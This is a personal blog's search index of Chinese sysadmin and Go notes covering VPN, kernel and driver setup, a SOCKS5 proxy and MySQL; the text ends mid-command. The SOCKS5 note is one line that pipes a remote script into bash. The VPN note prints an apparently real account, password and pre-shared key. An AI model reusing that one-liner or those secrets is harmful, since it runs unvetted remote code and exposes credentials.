<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/04/21/go%20learing/"/>
      <url>/2024/04/21/go%20learing/</url>
      
        <content type="html"><![CDATA[<p>函数接口<br>bufio.NewReader将会返回一个执行Reader对象的指针<br>从键盘输入</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> newreader *bufio.Reader = bufio.NewReader(os.Stdin)</span><br><span class="line">input,err := newreader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(err==<span class="literal">nil</span>)&#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;you input string is %s&quot;</span>,input)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件io</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">inputfile,inputerr := os.Open(<span class="string">&quot;file.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input != <span class="literal">nil</span>)&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;open file error!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> inputfile.Close()</span><br><span class="line">newfilereader := bufio.NewReader(inputfile)</span><br><span class="line">inputstring,inputerr := newfilereader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(inputerr != <span class="literal">nil</span>)&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;read file error!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;input string is :%s&quot;</span>,inputstring)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go 包管理<br>Go 1.5 引入了vendor 机制，但是需要手动设置环境变量 GO15VENDOREXPERIMENT&#x3D; 1，Go编译器才能启用。</p><p>从Go1.6起，默认开启 vendor 目录查找，vendor 机制就是在包中引入 vendor 目录，将依赖的外部包复制到 vendor 目录下，编译器在查找外部依赖包时，优先在 vendor 目录下查找。整个查找第三方包的流程如下：</p><p>在当前vendor目录（如果当前目录存在vendor目录的话）查找依赖包；<br>如果当前目录不存在vendor目录，则到上一级目录继续查找；<br>重复步骤2，直到到达$GOPATH&#x2F;src目录，查找vendor目录中是否存在依赖包；<br>如何没有查找到依赖包，则继续在$GOROOT目录查找；<br>如果没有查找到，则继续在$GOPATH&#x2F;src目录查找。<br>在发布 1.6 版本时，该环境变量的值已经默认设置为 1 了，该值可以使用 go env 命令查看。在发布 1.7 版本时，已去掉该环境变量，默认开启 vendor 特性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/21/l2tp/"/>
      <url>/2024/04/21/l2tp/</url>
      
        <content type="html"><![CDATA[<h3 id="1-预操作"><a href="#1-预操作" class="headerlink" title="1.预操作"></a>1.预操作</h3><h5 id="1-安装组件"><a href="#1-安装组件" class="headerlink" title="1.安装组件"></a>1.安装组件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install strongswan xl2tpd ppp lsof</span><br></pre></td></tr></table></figure><h5 id="2-加载需要的内核模块"><a href="#2-加载需要的内核模块" class="headerlink" title="2.加载需要的内核模块"></a>2.加载需要的内核模块</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modprobe l2tp_ppp</span><br><span class="line">modprobe udp_tunnel</span><br><span class="line">modprobe l2tp_netlink</span><br><span class="line">modprobe l2tp_core</span><br></pre></td></tr></table></figure><h3 id="3-配置xl2tpd"><a href="#3-配置xl2tpd" class="headerlink" title="3.配置xl2tpd"></a>3.配置xl2tpd</h3><p>修改配置文件 &#x2F;etc&#x2F;xl2tpd&#x2F;xl2tpd.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[lac myvpn] <span class="comment">#myvpn为vpn名称</span></span><br><span class="line">lns = 121.248.154.251 <span class="comment">#vpn服务器的地址</span></span><br><span class="line">ppp debug = no <span class="comment">#关闭调试信息</span></span><br><span class="line">pppoptfile = /etc/ppp/options.l2tpd.client <span class="comment">#验证文件的路径</span></span><br><span class="line">refuse chap = <span class="built_in">yes</span></span><br><span class="line">require pap = <span class="built_in">yes</span></span><br><span class="line">length bit = <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>修改验证文件&#x2F;etc&#x2F;ppp&#x2F;options.l2tpd.client</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ipcp-accept-local</span><br><span class="line">ipcp-accept-remote</span><br><span class="line">refuse-eap</span><br><span class="line">require-chap</span><br><span class="line">require-mschap-v2</span><br><span class="line">noccp</span><br><span class="line">noauth</span><br><span class="line">logfile /var/log/xl2tpd.<span class="built_in">log</span></span><br><span class="line">idle 72000</span><br><span class="line">mtu 1410</span><br><span class="line">mru 1410</span><br><span class="line">defaultroute</span><br><span class="line">usepeerdns</span><br><span class="line">debug</span><br><span class="line">connect-delay 5000</span><br><span class="line">name <span class="string">&quot;2111605319&quot;</span> <span class="comment">#vpn账号</span></span><br><span class="line">password <span class="string">&quot;yh20021007&quot;</span> <span class="comment">#vpn密码</span></span><br></pre></td></tr></table></figure><h3 id="4-配置预共享密钥"><a href="#4-配置预共享密钥" class="headerlink" title="4.配置预共享密钥"></a>4.配置预共享密钥</h3><p>vim &#x2F;etc&#x2F;ipsec.secrets<br>添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: PSK <span class="string">&quot;njfu.edu&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-配置ipsec"><a href="#5-配置ipsec" class="headerlink" title="5.配置ipsec"></a>5.配置ipsec</h3><p>vim &#x2F;etc&#x2F;ipsec.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">config setup</span><br><span class="line"></span><br><span class="line">conn %default</span><br><span class="line">    ikelifetime=60m</span><br><span class="line">    keylife=20m</span><br><span class="line">    rekeymargin=3m</span><br><span class="line">    keyingtries=1</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    authby=secret</span><br><span class="line">    ike=aes128-sha1-modp1024,3des-sha1-modp1024!</span><br><span class="line">    esp=aes128-sha1-modp1024,3des-sha1-modp1024!</span><br><span class="line"></span><br><span class="line">conn myvpn</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    left=%defaultroute</span><br><span class="line">    auto=add</span><br><span class="line">    authby=secret</span><br><span class="line">    rekey=<span class="built_in">yes</span></span><br><span class="line">    ikelifetime=8h</span><br><span class="line">    keylife=1h</span><br><span class="line">    <span class="built_in">type</span>=transport</span><br><span class="line">    leftprotoport=17/1701</span><br><span class="line">    rightprotoport=17/1701</span><br><span class="line">    left=172.19.123.72</span><br><span class="line">    right=121.248.154.251</span><br></pre></td></tr></table></figure><h3 id="6-启动vpn并激活连接到vpn"><a href="#6-启动vpn并激活连接到vpn" class="headerlink" title="6.启动vpn并激活连接到vpn"></a>6.启动vpn并激活连接到vpn</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ipsec restart</span><br><span class="line">service xl2tpd restart</span><br><span class="line"><span class="comment">#连接接到指定的vpn</span></span><br><span class="line">ipsec up myvpn</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /var/run/xl2tpd -p</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;c myvpn&quot;</span> &gt; /var/run/xl2tpd/l2tp-control <span class="comment">#这里的myvpn要和前面匹配</span></span><br></pre></td></tr></table></figure><h3 id="7-确认连接成功"><a href="#7-确认连接成功" class="headerlink" title="7.确认连接成功"></a>7.确认连接成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行指令</span></span><br><span class="line">ipsec status</span><br></pre></td></tr></table></figure><p>如果显示<br>Security Associations (1 up, 0 connecting):<br>       myvpn[1]: ESTABLISHED 17 minutes ago, 172.19.123.72[172.19.123.72]…121.248.154.251[121.248.154.251]<br>       myvpn{1}:  INSTALLED, TRANSPORT, reqid 1, ESP in UDP SPIs: c7ed658e_i 8cd83099_o<br>       myvpn{1}:   172.19.123.72&#x2F;32[udp&#x2F;l2f] &#x3D;&#x3D;&#x3D; 121.248.154.251&#x2F;32[udp&#x2F;l2f]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行指令 如果发现有个ppp的网卡，即连接成功</span></span><br><span class="line">ip addr</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/21/centos%E8%A7%A3%E5%8E%8Binitrd/"/>
      <url>/2024/04/21/centos%E8%A7%A3%E5%8E%8Binitrd/</url>
      
        <content type="html"><![CDATA[<p>修复boot分区</p><ul><li>1.centos默认的grub安装命令为grub2-install不是grub-install</li><li>2.hexdump命令所在的软件包为linux-utils<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y linux-utils</span><br></pre></td></tr></table></figure>解压initrd.img<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xz -dc initrd.img | cpio -<span class="built_in">id</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/21/socks5%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/04/21/socks5%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sL https://my.oofeye.com/work/Socks5/ss5.sh)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>嵌入式linux</title>
      <link href="/2023/06/25/%E5%B5%8C%E5%85%A5%E5%BC%8Flinux/"/>
      <url>/2023/06/25/%E5%B5%8C%E5%85%A5%E5%BC%8Flinux/</url>
      
        <content type="html"><![CDATA[<h3 id="1-启动步骤"><a href="#1-启动步骤" class="headerlink" title="1.启动步骤"></a>1.启动步骤</h3><p>1.加载bootloader（uboot)<br>2.加载设备树<br>3.加载linux内核，initrd.img ,挂载跟文件系统<br>4.tty，登录系统</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>centos7.9解决RTL8125网卡不识别的问题</title>
      <link href="/2023/05/15/centos7-9%E8%A7%A3%E5%86%B3RTL8125%E7%BD%91%E5%8D%A1%E4%B8%8D%E8%AF%86%E5%88%AB%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2023/05/15/centos7-9%E8%A7%A3%E5%86%B3RTL8125%E7%BD%91%E5%8D%A1%E4%B8%8D%E8%AF%86%E5%88%AB%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="1-获取网卡驱动源码"><a href="#1-获取网卡驱动源码" class="headerlink" title="1.获取网卡驱动源码"></a>1.获取网卡驱动源码</h3><p><a href="https://www.realtek.com/zh/component/zoo/category/network-interface-controllers-10-100-1000m-gigabit-ethernet-pci-express-software">点击跳转到realtek官网下载页面</a></p><h3 id="2-升级内核-可选"><a href="#2-升级内核-可选" class="headerlink" title="2.升级内核(可选)"></a>2.升级内核(可选)</h3><p>不确定这个网卡依赖还是不依赖内核，建议升级内核版本</p><h5 id="2-1-检查是否安装ELRepo"><a href="#2-1-检查是否安装ELRepo" class="headerlink" title="2.1 检查是否安装ELRepo"></a>2.1 检查是否安装ELRepo</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum  --disablerepo=<span class="string">&quot;*&quot;</span>  --enablerepo=<span class="string">&quot;elrepo-kernel&quot;</span>  list  available</span><br><span class="line">已加载插件：fastestmirror</span><br><span class="line">Error getting repository data <span class="keyword">for</span> elrepo-kernel, repository not found</span><br><span class="line"><span class="comment"># 看到error说明没有安装ELRepo</span></span><br></pre></td></tr></table></figure><h5 id="2-2-升级安装ELRepo"><a href="#2-2-升级安装ELRepo" class="headerlink" title="2.2 升级安装ELRepo"></a>2.2 升级安装ELRepo</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br><span class="line"><span class="comment">#载入ELRepo仓库的公共密钥</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line"></span><br><span class="line">yum -y update</span><br><span class="line"><span class="comment">#载入ELRepo仓库的公共密钥</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-3-查看可用安装包"><a href="#2-3-查看可用安装包" class="headerlink" title="2.3.查看可用安装包"></a>2.3.查看可用安装包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看可用的系统内核包</span></span><br><span class="line">yum  --disablerepo=<span class="string">&quot;*&quot;</span>  --enablerepo=<span class="string">&quot;elrepo-kernel&quot;</span>  list  available</span><br><span class="line"></span><br><span class="line"><span class="comment"># 长期维护版本为lt，最新主线稳定版为ml</span></span><br></pre></td></tr></table></figure><h5 id="2-4-手动下载"><a href="#2-4-手动下载" class="headerlink" title="2.4 手动下载"></a>2.4 手动下载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://linux-mirrors.fnal.gov/linux/elrepo/archive/kernel/el7/x86_64/RPMS/kernel-lt-headers-5.4.242-1.el7.elrepo.x86_64.rpm</span><br><span class="line">wget http://linux-mirrors.fnal.gov/linux/elrepo/archive/kernel/el7/x86_64/RPMS/kernel-lt-tools-libs-5.4.242-1.el7.elrepo.x86_64.rpm</span><br><span class="line">wget http://linux-mirrors.fnal.gov/linux/elrepo/archive/kernel/el7/x86_64/RPMS/kernel-lt-devel-5.4.242-1.el7.elrepo.x86_64.rpm</span><br><span class="line">wget http://linux-mirrors.fnal.gov/linux/elrepo/archive/kernel/el7/x86_64/RPMS/kernel-lt-tools-5.4.242-1.el7.elrepo.x86_64.rpm</span><br><span class="line">wget http://linux-mirrors.fnal.gov/linux/elrepo/archive/kernel/el7/x86_64/RPMS/kernel-lt-tools-5.4.242-1.el7.elrepo.x86_64.rpm</span><br><span class="line"><span class="comment">#安装完成之后重新生成grub配置文件</span></span><br><span class="line"><span class="comment">#同样也可以删除掉旧的内核</span></span><br><span class="line">rpm -qa | grep kernel</span><br><span class="line"><span class="comment">#然后移除相关的旧的内核包</span></span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure><h5 id="2-5-查看内核启动顺序"><a href="#2-5-查看内核启动顺序" class="headerlink" title="2.5 查看内核启动顺序"></a>2.5 查看内核启动顺序</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">awk -F\&#x27; <span class="string">&#x27;$1==&quot;menuentry &quot; &#123;print i++ &quot; : &quot; $2&#125;&#x27;</span> /boot/grub2/grub.cfg</span><br><span class="line"></span><br><span class="line">0 : CentOS Linux (5.4.108-1.el7.elrepo.x86_64) 7 (Core)</span><br><span class="line">1 : CentOS Linux (3.10.0-1160.11.1.el7.x86_64) 7 (Core)</span><br><span class="line">2 : CentOS Linux (3.10.0-1160.el7.x86_64) 7 (Core)</span><br><span class="line">3 : CentOS Linux (0-rescue-20210128140208453518997635111697) 7 (Core)</span><br></pre></td></tr></table></figure><h5 id="2-6-安装辅助工具"><a href="#2-6-安装辅助工具" class="headerlink" title="2.6 安装辅助工具"></a>2.6 安装辅助工具</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y grub2-pc</span><br></pre></td></tr></table></figure><h5 id="2-7-设置内核启动顺序"><a href="#2-7-设置内核启动顺序" class="headerlink" title="2.7 设置内核启动顺序"></a>2.7 设置内核启动顺序</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grub2-set-default 0</span><br></pre></td></tr></table></figure><h5 id="2-8-重新生成grub配置文件"><a href="#2-8-重新生成grub配置文件" class="headerlink" title="2.8 重新生成grub配置文件"></a>2.8 重新生成grub配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure><h5 id="2-9-重启"><a href="#2-9-重启" class="headerlink" title="2.9 重启"></a>2.9 重启</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><h3 id="3-更换gcc"><a href="#3-更换gcc" class="headerlink" title="3.更换gcc"></a>3.更换gcc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-binutils-2.30-55.el7.1.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-gcc-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-gcc-c%2B%2B-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-gcc-gdb-plugin-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-gcc-gfortran-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-gcc-plugin-devel-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-libquadmath-devel-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-libstdc%2B%2B-devel-8.3.1-3.2.el7.x86_64.rpm</span><br><span class="line">wget https://mirrors.ustc.edu.cn/centos/7.9.2009/sclo/x86_64/rh/Packages/d/devtoolset-8-runtime-8.1-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p>将所有下载好的软件包安装完毕<br>激活toolchain</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/rh/devtoolset-8 </span><br><span class="line">./enable</span><br><span class="line"><span class="comment">#直接替换旧的gcc</span></span><br><span class="line"><span class="comment">#旧的gcc是运行的 /usr/bin/gcc，所以将该目录下的gcc/g++替换为刚安装的新版本gcc软连接，免得每次enable</span></span><br><span class="line"><span class="built_in">mv</span> /usr/bin/gcc /usr/bin/gcc-4.8.5 </span><br><span class="line"><span class="built_in">ln</span> -s /opt/rh/devtoolset-8/root/bin/gcc /usr/bin/gcc </span><br><span class="line"><span class="built_in">mv</span> /usr/bin/g++ /usr/bin/g++-4.8.5 </span><br><span class="line"><span class="built_in">ln</span> -s /opt/rh/devtoolset-8/root/bin/g++ /usr/bin/g++ </span><br><span class="line">查看gcc版本是否已经升级成功</span><br><span class="line">gcc --version </span><br><span class="line">g++ --version</span><br></pre></td></tr></table></figure><h3 id="4-开始编译第一步下载驱动源码，并安装"><a href="#4-开始编译第一步下载驱动源码，并安装" class="headerlink" title="4.开始编译第一步下载驱动源码，并安装"></a>4.开始编译第一步下载驱动源码，并安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> r8125-9.011.01 </span><br><span class="line">./autorun.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7磁盘扩容</title>
      <link href="/2023/05/15/centos7%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/"/>
      <url>/2023/05/15/centos7%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql安装配置</title>
      <link href="/2023/05/11/mysql%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/05/11/mysql%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql安装配置"><a href="#mysql安装配置" class="headerlink" title="mysql安装配置"></a>mysql安装配置</h1><h2 id="1-安装配置"><a href="#1-安装配置" class="headerlink" title="1.安装配置"></a>1.安装配置</h2><h3 id="1-Archlinux"><a href="#1-Archlinux" class="headerlink" title="1.Archlinux"></a>1.Archlinux</h3><h5 id="1-安装mariadb"><a href="#1-安装mariadb" class="headerlink" title="1.安装mariadb"></a>1.安装mariadb</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S mariadb</span><br></pre></td></tr></table></figure><h5 id="2-初始化数据库"><a href="#2-初始化数据库" class="headerlink" title="2.初始化数据库"></a>2.初始化数据库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br></pre></td></tr></table></figure><h5 id="3-启动数据库"><a href="#3-启动数据库" class="headerlink" title="3.启动数据库"></a>3.启动数据库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure><h5 id="4-修改root密码"><a href="#4-修改root密码" class="headerlink" title="4.修改root密码"></a>4.修改root密码</h5><p>首次使用root用户登录不需要密码并且只能在本地登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter user<span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;新密码&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果要开启远程登录<br>对于mariadb来说同一个用户在本地登录和在远程登录，密码是互不干扰的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span> WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><h3 id="2-Centos"><a href="#2-Centos" class="headerlink" title="2.Centos"></a>2.Centos</h3><h4 id="1-1-从官网获取"><a href="#1-1-从官网获取" class="headerlink" title="1.1.从官网获取"></a>1.1.从官网获取</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-community-common-8.0.33-1.el7.x86_64.rpm</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-community-icu-data-files-8.0.33-1.el7.x86_64.rpm</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-community-libs-8.0.33-1.el7.x86_64.rpm</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-community-client-plugins-8.0.33-1.el7.x86_64.rpm</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-community-client-plugins-8.0.33-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh *.rpm</span><br></pre></td></tr></table></figure><h4 id="1-2-从yum源获取"><a href="#1-2-从yum源获取" class="headerlink" title="1.2 从yum源获取"></a>1.2 从yum源获取</h4><p>2.安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install 